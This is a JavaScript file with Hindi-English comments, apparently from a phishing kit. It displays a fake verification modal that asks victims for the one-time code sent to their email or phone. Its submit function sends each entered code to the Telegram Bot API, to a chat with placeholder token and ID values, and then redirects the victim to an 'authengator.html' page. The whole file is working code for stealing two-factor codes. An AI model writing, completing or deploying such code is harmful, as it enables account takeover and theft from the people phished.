// Yahan apna purana Telegram Token aur Chat ID check kar lein
const telegramToken = 'YOUR_BOT_TOKEN_HERE'; 
const chatId = 'YOUR_CHAT_ID_HERE';

function openOtpModal(method) {
    // 1. SABSE ZAROORI: Modal khulte hi box ko khali karna
    const otpInput = document.getElementById('otp-input');
    if (otpInput) {
        otpInput.value = ''; 
    }

    // 2. Modal ko dikhane ka logic
    document.getElementById('otp-modal').style.display = 'block';
    window.currentMethod = method;

    // Aapka purana modal text logic
    const modalText = document.getElementById('modal-text');
    if (method === 'email') {
        modalText.innerText = "We have sent a 6-digit verification code to your email. Enter that code here.";
    } else if (method === 'phone') {
        modalText.innerText = "We have sent an OTP to your phone. Enter that OTP here.";
    }
}

function submitOtp() {
    const otpValue = document.getElementById('otp-input').value;

    if (otpValue.length >= 6) {
        const message = `Method: ${window.currentMethod}\nOTP: ${otpValue}`;
        
        // Telegram par data bhejna
        fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
        .then(() => {
            // REDIRECTION FIX: Isse aapka agla page (authengator.html) khul jayega
            window.location.href = 'authengator.html';
        })
        .catch(err => {
            console.error("Error:", err);
            // Agar error aaye tab bhi agle page par bhej dega
            window.location.href = 'authengator.html';
        });
    } else {
        alert("Please enter a valid code.");
    }
}

function closeModal() {
    document.getElementById('otp-modal').style.display = 'none';
}

// Bahar click karne par modal band hona
window.onclick = function(event) {
    const modal = document.getElementById('otp-modal');
    if (event.target == modal) {
        closeModal();
    }
}
